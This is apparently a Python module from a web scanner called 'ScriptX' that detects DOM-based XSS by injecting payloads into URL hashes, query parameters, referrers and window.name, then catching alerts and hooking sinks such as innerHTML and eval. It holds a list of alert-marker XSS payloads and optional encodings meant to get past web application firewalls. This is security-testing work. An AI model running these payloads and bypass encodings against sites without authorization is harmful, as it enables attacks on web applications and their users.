"""
ScriptX DOM-based XSS Detection
Detects DOM XSS vulnerabilities through source-sink analysis and execution verification
"""

import asyncio
from typing import List, Dict, Optional, Set
from dataclasses import dataclass, field
from urllib.parse import urlparse, urlencode, parse_qs
import time
import re

from core.browser import BrowserController
from core.config import Config
from xss.payloads import PayloadEngine
from crawler.dom_analyzer import DomAnalyzer, DOMSink, DOMSource
from utils.logger import logger


@dataclass
class DOMXSSVuln:
    """Represents a confirmed DOM-based XSS vulnerability"""
    url: str  # Original URL
    source: str  # e.g., location.hash, document.URL
    sink: str  # e.g., innerHTML, eval
    payload: str
    injection_point: str  # hash, query param, etc.
    poc_url: Optional[str] = None  # Full URL with payload (PoC)
    alert_message: Optional[str] = None
    code_context: Optional[str] = None
    screenshot_path: Optional[str] = None
    severity: str = 'high'
    timestamp: float = field(default_factory=time.time)
    
    def to_dict(self) -> Dict:
        return {
            'type': 'dom_xss',
            'url': self.poc_url or self.url,  # Use PoC URL if available
            'original_url': self.url,
            'poc_url': self.poc_url,
            'source': self.source,
            'sink': self.sink,
            'payload': self.payload,
            'injection_point': self.injection_point,
            'alert_message': self.alert_message,
            'code_context': self.code_context,
            'screenshot': self.screenshot_path,
            'severity': self.severity,
            'timestamp': self.timestamp
        }


class DomXSS:
    """
    DOM-based XSS Detection Engine
    
    Detection strategy:
    1. Analyze page for sources and sinks
    2. Inject payloads into sources (hash, params)
    3. Monitor for sink execution
    4. Verify via alert capture
    """
    
    def __init__(self, browser: BrowserController, config: Config):
        self.browser = browser
        self.config = config
        self.payload_engine = PayloadEngine(config.custom_payloads)
        self.dom_analyzer = DomAnalyzer()
        self.vulnerabilities: List[DOMXSSVuln] = []
        self._waf_logged_domains: set = set()  # Track domains where WAF was already logged
        
    async def test_url(self, url: str) -> List[DOMXSSVuln]:
        """
        Test a URL for DOM-based XSS.
        
        Args:
            url: Target URL
            
        Returns:
            List of confirmed vulnerabilities
        """
        vulns = []
        
        # First, analyze the page for sources and sinks
        await self.browser.navigate(url)
        html_content = await self.browser.get_page_source()
        
        # WAF Fingerprinting (only log once per domain)
        await self._check_waf(url, html_content)
        
        dom_analysis = self.dom_analyzer.analyze_html(html_content)
        
        if dom_analysis['risk_score'] < 10:
            logger.debug(f"Low DOM XSS risk for {url}, skipping")
            return vulns
        
        logger.debug(f"DOM analysis: {len(dom_analysis['sources'])} sources, {len(dom_analysis['sinks'])} sinks")
        
        # Test each source type
        sources_to_test = self.dom_analyzer.get_injectable_sources()
        
        for source in sources_to_test:
            source_vulns = await self._test_source(url, source)
            vulns.extend(source_vulns)
        
        # Also test URL hash and params regardless of static analysis
        hash_vulns = await self._test_hash_injection(url)
        vulns.extend(hash_vulns)
        
        param_vulns = await self._test_param_injection(url)
        vulns.extend(param_vulns)
        
        return vulns
    
    async def _check_waf(self, url: str, page_source: str):
        """Check for WAF (only once per domain)"""
        if not self.config.waf_fingerprint:
            return
        try:
            from urllib.parse import urlparse
            from utils.waf_detector import waf_detector
            
            domain = urlparse(url).netloc
            if domain not in self._waf_logged_domains:
                waf_result = waf_detector.detect(url, 200, {}, page_source)
                if waf_result.detected:
                    logger.warning(f"WAF detected: {waf_result.waf_type.value} (confidence: {waf_result.confidence:.0%})")
                    self._waf_logged_domains.add(domain)
        except Exception:
            pass
    
    async def _apply_delay(self):
        """Apply request delay (random or fixed)"""
        import random as rnd
        import asyncio
        if self.config.random_delay:
            delay = rnd.randint(self.config.min_delay, self.config.max_delay)
            await asyncio.sleep(delay / 1000)
        elif self.config.request_delay > 0:
            await asyncio.sleep(self.config.request_delay / 1000)
    
    async def _test_source(self, url: str, source: str) -> List[DOMXSSVuln]:
        """Test a specific DOM source for XSS"""
        vulns = []
        
        if 'location.hash' in source:
            return await self._test_hash_injection(url)
        elif 'location.search' in source:
            return await self._test_param_injection(url)
        elif 'document.referrer' in source:
            return await self._test_referrer_injection(url)
        elif 'window.name' in source:
            return await self._test_window_name_injection(url)
        
        return vulns
    
    async def _test_hash_injection(self, url: str) -> List[DOMXSSVuln]:
        """Test URL hash fragment for DOM XSS"""
        vulns = []
        
        # Get DOM-specific payloads
        payloads = self._get_dom_payloads()
        
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        if parsed.query:
            base_url += f"?{parsed.query}"
        
        for payload in payloads:
            # Inject payload in hash
            test_url = f"{base_url}#{payload}"
            
            self.browser.clear_alerts()
            
            try:
                await self.browser.navigate(test_url)
                await asyncio.sleep(2.0)  # Wait 2 seconds for JS execution
                
                # Check for alerts
                if self.browser.captured_alerts:
                    alert = self.browser.captured_alerts[0]
                    
                    if self.payload_engine.payload_contains_marker(alert.message):
                        vuln = DOMXSSVuln(
                            poc_url=test_url,
                            url=url,
                            source='location.hash',
                            sink='unknown',  # Could be any sink
                            payload=payload,
                            injection_point='hash',
                            alert_message=alert.message
                        )
                        
                        if self.config.screenshots:
                            screenshot_path = f"{self.config.output_dir}/screenshots/dom_hash_{int(time.time())}.png"
                            await self.browser.screenshot(screenshot_path)
                            vuln.screenshot_path = screenshot_path
                        
                        vulns.append(vuln)
                        self.vulnerabilities.append(vuln)
                        
                        logger.success(f"DOM XSS CONFIRMED (hash): {url}")
                        break  # Found vuln, stop testing this source
                
            except Exception as e:
                logger.debug(f"Hash injection error: {e}")
            
            # Rate limiting
            if self.config.request_delay > 0:
                await asyncio.sleep(self.config.request_delay / 1000)
        
        return vulns
    
    async def _test_param_injection(self, url: str) -> List[DOMXSSVuln]:
        """Test URL parameters for DOM XSS"""
        vulns = []
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            # Add a test parameter
            params = {'q': [''], 'search': [''], 'query': [''], 'id': [''], 'data': ['']}
        
        payloads = self._get_dom_payloads()
        
        for param_name in params:
            for payload in payloads:
                # Build test URL
                test_params = dict(params)
                test_params[param_name] = [payload]
                
                query_string = urlencode(test_params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query_string}"
                
                if parsed.fragment:
                    test_url += f"#{parsed.fragment}"
                
                self.browser.clear_alerts()
                
                try:
                    await self.browser.navigate(test_url)
                    await asyncio.sleep(2.0)  # Wait 2 seconds for JS execution
                    
                    if self.browser.captured_alerts:
                        alert = self.browser.captured_alerts[0]
                        
                        if self.payload_engine.payload_contains_marker(alert.message):
                            vuln = DOMXSSVuln(
                                poc_url=test_url,
                                url=url,
                                source='location.search',
                                sink='unknown',
                                payload=payload,
                                injection_point=f'param:{param_name}',
                                alert_message=alert.message
                            )
                            
                            if self.config.screenshots:
                                screenshot_path = f"{self.config.output_dir}/screenshots/dom_param_{int(time.time())}.png"
                                await self.browser.screenshot(screenshot_path)
                                vuln.screenshot_path = screenshot_path
                            
                            vulns.append(vuln)
                            self.vulnerabilities.append(vuln)
                            
                            logger.success(f"DOM XSS CONFIRMED (param): {param_name} @ {url}")
                            break
                    
                except Exception as e:
                    logger.debug(f"Param injection error: {e}")
                
                if self.config.request_delay > 0:
                    await asyncio.sleep(self.config.request_delay / 1000)
        
        return vulns
    
    async def _test_referrer_injection(self, url: str) -> List[DOMXSSVuln]:
        """Test document.referrer for DOM XSS"""
        vulns = []
        
        # This requires navigating FROM a page with payload in URL
        # to the target page
        payloads = self._get_dom_payloads()[:3]  # Limited payloads
        
        for payload in payloads:
            try:
                # Create a data URL with script that navigates to target
                referrer_url = f"data:text/html,<script>location.href='{url}'</script>{payload}"
                
                self.browser.clear_alerts()
                await self.browser.navigate(referrer_url)
                await asyncio.sleep(2.0)  # Wait 2 seconds for JS execution
                
                if self.browser.captured_alerts:
                    alert = self.browser.captured_alerts[0]
                    if self.payload_engine.payload_contains_marker(alert.message):
                        vuln = DOMXSSVuln(
                            poc_url=referrer_url,
                            url=url,
                            source='document.referrer',
                            sink='unknown',
                            payload=payload,
                            injection_point='referrer',
                            alert_message=alert.message
                        )
                        vulns.append(vuln)
                        self.vulnerabilities.append(vuln)
                        logger.success(f"DOM XSS CONFIRMED (referrer): {url}")
                        break
                        
            except Exception as e:
                logger.debug(f"Referrer injection error: {e}")
        
        return vulns
    
    async def _test_window_name_injection(self, url: str) -> List[DOMXSSVuln]:
        """Test window.name for DOM XSS"""
        vulns = []
        
        payloads = self._get_dom_payloads()[:3]
        
        for payload in payloads:
            try:
                self.browser.clear_alerts()
                
                # First navigate to set window.name
                await self.browser.execute_js(f'window.name = `{payload}`')
                
                # Then navigate to target
                await self.browser.navigate(url)
                await asyncio.sleep(2.0)  # Wait 2 seconds for JS execution
                
                if self.browser.captured_alerts:
                    alert = self.browser.captured_alerts[0]
                    if self.payload_engine.payload_contains_marker(alert.message):
                        vuln = DOMXSSVuln(
                            poc_url=url,
                            url=url,
                            source='window.name',
                            sink='unknown',
                            payload=payload,
                            injection_point='window.name',
                            alert_message=alert.message
                        )
                        vulns.append(vuln)
                        self.vulnerabilities.append(vuln)
                        logger.success(f"DOM XSS CONFIRMED (window.name): {url}")
                        break
                        
            except Exception as e:
                logger.debug(f"Window.name injection error: {e}")
        
        return vulns
    
    async def test_with_sink_monitoring(self, url: str) -> List[DOMXSSVuln]:
        """
        Advanced test with DOM sink monitoring.
        Intercepts dangerous functions to detect execution.
        """
        vulns = []
        
        # Inject monitoring script
        monitor_script = '''
        (function() {
            window.__scriptx_sinks = [];
            
            // Hook document.write
            const _write = document.write;
            document.write = function() {
                window.__scriptx_sinks.push({sink: 'document.write', args: Array.from(arguments)});
                return _write.apply(this, arguments);
            };
            
            // Hook innerHTML setter
            const _innerHTML = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML');
            Object.defineProperty(Element.prototype, 'innerHTML', {
                set: function(val) {
                    window.__scriptx_sinks.push({sink: 'innerHTML', value: val, element: this.tagName});
                    return _innerHTML.set.call(this, val);
                },
                get: _innerHTML.get
            });
            
            // Hook eval
            const _eval = window.eval;
            window.eval = function(code) {
                window.__scriptx_sinks.push({sink: 'eval', code: code});
                return _eval.apply(this, arguments);
            };
        })();
        '''
        
        try:
            await self.browser.navigate(url)
            await self.browser.execute_js(monitor_script)
            
            # Now test with payloads
            payloads = self._get_dom_payloads()
            
            for payload in payloads:
                # Test via hash
                test_url = f"{url}#{payload}"
                
                self.browser.clear_alerts()
                await self.browser.navigate(test_url)
                await asyncio.sleep(2.0)  # Wait 2 seconds for JS execution
                
                # Check monitored sinks
                sinks = await self.browser.execute_js('window.__scriptx_sinks || []')
                
                for sink_event in sinks:
                    # Check if our payload reached a sink
                    sink_data = str(sink_event)
                    if self.payload_engine.XSS_MARKER in sink_data:
                        vuln = DOMXSSVuln(
                            poc_url=test_url,
                            url=url,
                            source='location.hash',
                            sink=sink_event.get('sink', 'unknown'),
                            payload=payload,
                            injection_point='hash',
                            code_context=sink_data[:200]
                        )
                        vulns.append(vuln)
                        self.vulnerabilities.append(vuln)
                        logger.success(f"DOM XSS via sink {sink_event.get('sink')}: {url}")
                
                # Also check alerts
                if self.browser.captured_alerts:
                    for alert in self.browser.captured_alerts:
                        if self.payload_engine.payload_contains_marker(alert.message):
                            vuln = DOMXSSVuln(
                                poc_url=test_url,
                                url=url,
                                source='location.hash',
                                sink='alert execution',
                                payload=payload,
                                injection_point='hash',
                                alert_message=alert.message
                            )
                            vulns.append(vuln)
                            self.vulnerabilities.append(vuln)
                
                # Clear for next test
                await self.browser.execute_js('window.__scriptx_sinks = []')
                
        except Exception as e:
            logger.debug(f"Sink monitoring error: {e}")
        
        return vulns
    
    def _get_dom_payloads(self) -> List[str]:
        """Get payloads suitable for DOM XSS testing, including encoded versions"""
        # DOM XSS specific payloads
        dom_specific = [
            '<img src=x onerror=alert({marker})>',
            '<svg onload=alert({marker})>',
            '"><img src=x onerror=alert({marker})>',
            "'-alert({marker})-'",
            '";alert({marker});//',
            '</script><script>alert({marker})</script>',
            'javascript:alert({marker})',
            '${alert({marker})}',
        ]
        
        # Replace markers
        result = []
        for p in dom_specific:
            marker = f"SCRIPTX_XSS_{len(result)}"
            result.append(p.replace('{marker}', marker))
        
        # Add some from payload engine
        result.extend(self.payload_engine.get_quick_payloads())
        
        # Add encoded versions for WAF bypass
        if self.config.waf_bypass:
            encoded_payloads = []
            for p in result[:8]:  # Encode first 8 payloads
                # URL encoding
                encoded_payloads.append(self.payload_engine.encode_payload(p, 'url'))
                # Double URL encoding
                encoded_payloads.append(self.payload_engine.encode_payload(p, 'url_double'))
                # HTML hex encoding
                encoded_payloads.append(self.payload_engine.encode_payload(p, 'html_hex'))
            
            result.extend(encoded_payloads)
        
        return result
    
    def get_results(self) -> List[Dict]:
        """Get all vulnerability results"""
        return [v.to_dict() for v in self.vulnerabilities]
    
    def get_stats(self) -> Dict:
        """Get detection statistics"""
        by_source = {}
        for v in self.vulnerabilities:
            by_source[v.source] = by_source.get(v.source, 0) + 1
        
        return {
            'total_vulnerabilities': len(self.vulnerabilities),
            'by_source': by_source
        }
